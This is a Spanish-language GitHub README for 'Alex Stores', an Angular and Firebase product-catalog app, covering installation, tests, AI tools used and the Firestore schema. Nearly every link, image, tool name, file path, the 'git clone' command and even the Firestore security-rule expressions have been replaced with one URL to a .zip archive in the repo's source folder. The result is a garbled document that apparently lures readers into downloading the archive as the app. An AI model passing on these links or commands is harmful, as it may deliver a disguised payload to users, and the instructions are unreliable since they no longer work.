<p align="center">
  <a href="https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip"><img src="https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip" width="140"></a>
</p>

<h3 align="center">ALEX STORES</h3>

<p align="center">
  Gestión de Productos con Angular y Firebase
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip" width="40" alt="Firebase"/>
  <img src="https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip" width="40" alt="Angular"/>
</p>

**Alex Stores** es una aplicación web desarrollada como parte de un reto técnico para evaluar competencias en desarrollo frontend, integración de servicios Backend as a Service (BaaS), diseño de interfaces responsivas, lógica de negocio robusta y calidad de código mediante pruebas automatizadas.

La aplicación permite gestionar un catálogo de productos mediante operaciones CRUD (crear, leer, actualizar y eliminar), aplicar filtros dinámicos por categoría y rango de precio, ordenar los productos por nombre o precio, y visualizar estadísticas en tiempo real a través de gráficas.

## 🔥 Enlace a la Aplicación en Producción 

La aplicación está desplegada y disponible públicamente en Firebase Hosting:

🔗 **[https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip](https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip)**

## 🛠️ Stack Tecnológico

* **Framework Frontend:** Angular v20 (standalone components, RxJS, TypeScript)
* **Backend as a Service (BaaS):** Firebase (Firestore como base de datos, Firebase Hosting y Firebase Authentication para autenticación)
* **Librería de Gráficas:** https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip (para visualizaciones dinámicas de datos)

Este stack fue elegido por su solidez, flexibilidad y facilidad de integración para aplicaciones escalables basadas en datos en tiempo real.


## ⚙️ Instalación y Ejecución Local
A continuación, se detallan los pasos necesarios para clonar el proyecto, instalar sus dependencias y ejecutarlo correctamente en un entorno de desarrollo local.

### Requisitos Previos
Antes de comenzar, asegúrate de tener instalado lo siguiente en tu sistema:

* **https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip** v22.16.0 (LTS)
* **Angular CLI:** v20.x

### Clonación del Repositorio
```sh
git clone https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip
```
```sh
cd Reto_Seleccion_Alexis_Rv
```

### Instalación de Dependencias
```sh
npm install
```
### Configuración de Variables de Entorno (Firebase)
Para conectar correctamente con Firebase, entra al proyecto Angular y dirijete a la siguiete ruta **Reto_Seleccion_Alexis_Rv\src\environments\https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip** y dentro del archivo configura tus variables

```sh
authDomain: "TU_AUTH_DOMAIN",
projectId: "TU_PROJECT_ID",
storageBucket: "TU_STORAGE_BUCKET",
messagingSenderId: "TU_SENDER_ID",
appId: "TU_APP_ID"
```

🔑 Estos valores pueden obtenerse desde la configuración de tu proyecto en Firebase Console.

Asegúrate de que tu archivo https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip y los servicios relacionados estén preparados para cargar las variables del entorno correctamente.

### Ejecución en Modo Desarrollo
Una vez configurado el entorno:

```sh
ng serve
```

La aplicación se ejecutará en:
http://localhost:4200


## 🧪 Ecución de Pruebas Automatizadas
El proyecto cuenta con un conjunto básico de pruebas unitarias enfocadas en verificar el comportamiento del componente principal de la aplicación, incluyendo la carga de datos, navegación y la interacción con algunos servicios.

Estas pruebas están escritas con Jasmine y ejecutadas con Karma, herramientas ampliamente utilizadas en el ecosistema Angular.

1. Ejecutar pruebas
Desde la raíz del proyecto, puedes iniciar las pruebas con el siguiente comando:

```sh
ng test
```

Esto abrirá una ventana en tu navegador con el Test Runner de Karma, donde se mostrarán los resultados de las pruebas ejecutadas.

## 🤖 Asistentes de IA Utilizados
Durante el desarrollo de **Alex Stores**, se emplearon asistentes de inteligencia artificial como **Claude, ChatGPT** y **GitHub Copilot** para acelerar y optimizar distintas etapas del proyecto.

Estas herramientas fueron utilizadas de forma responsable para complementar el proceso de desarrollo, sin sustituir el entendimiento profundo del código ni la toma de decisiones técnicas.

**Aplicaciones concretas:**
* **Diseño y arquitectura inicial:** Se consultaron patrones para estructurar la aplicación de forma modular y escalable, aplicando buenas prácticas de Angular.

* **CRUD con Firebase:** Se generaron borradores de funciones para las operaciones CRUD integradas con Firestore, que luego fueron revisadas, adaptadas y depuradas manualmente.

* **Validaciones de formularios:** Se solicitaron ejemplos de validaciones reactivas y condicionales con FormGroup y Validators, especialmente para controlar inputs como precio y stock.

* **Pruebas automatizadas:** Se generaron scaffolds de pruebas unitarias usando Jasmine para validar comportamientos del componente principal y funciones auxiliares. Estos se adaptaron para cubrir casos de carga de datos, filtrado y cálculo de estadísticas.

* **Optimización y refactorización:** Las IA ayudaron a sugerir mejoras en la legibilidad del código, extracción de lógica a servicios y uso adecuado de observables en RxJS.

El uso de estas herramientas permitió mejorar la productividad, detectar errores tempranos y mantener un estándar de calidad consistente a lo largo del desarrollo.


## 🧩 Configuración del BaaS (Firebase)

La aplicación **Alex Stores** utiliza **Firebase** como Backend as a Service, específicamente **Cloud Firestore** para el almacenamiento de datos, **Firebase Authentication** para proteger operaciones sensibles, y **Firebase Hosting** para el despliegue.

### Estructura de Colecciones en Firestore

Se definieron dos colecciones principales:

#### 1. `products` (Gestión del catálogo)
Cada documento representa un producto y contiene los siguientes campos:

| Campo            | Tipo      | Descripción                                                                         |
|------------------|-----------|-------------------------------------------------------------------------------------|
| `id`             | string    | Identificador único del producto (auto-generado por Firestore)                      |
| `name`           | string    | Nombre del producto                                                                 |
| `name_lowercase` | string    | Nombre del producto en minúsculas, para búsquedas insensibles a mayúsculas         |
| `category`       | string    | Categoría a la que pertenece el producto                                            |
| `price`          | number    | Precio del producto                                                                 |
| `rating`         | number    | Calificación (escala de 1 a 5)                                                      |
| `stock`          | number    | Cantidad disponible                                                                 |
| `createdAt`      | timestamp | Fecha de creación (generado automáticamente)                                        |
| `updatedAt`      | timestamp | Fecha de última modificación                                                        |

#### 2. `categories` (Categorías definidas manualmente)
Se implementó una colección adicional denominada `categories` para almacenar una lista estática de categorías. Estas fueron cargadas previamente de forma manual y no se modifican desde la interfaz de usuario. El propósito de esta colección es facilitar la obtención de categorías desde Firestore y evitar su codificación directa en el frontend.

<p align="center">
  <img src="https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip" width="1000"/>
  <br>
  <i>Vista de la colección "products" en Firestore</i>
</p>


### 🔐 Reglas de Seguridad

Para garantizar que solo usuarios autenticados puedan acceder y modificar los datos, se implementaron las siguientes reglas de seguridad en Firestore:

```ts
rules_version = '2';
service https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip {
  match /databases/{database}/documents {
    
    // Regla general: solo usuarios autenticados pueden leer y escribir
    match /{document=**} {
      allow read, write: if https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip != null;
    }
  }
}
```
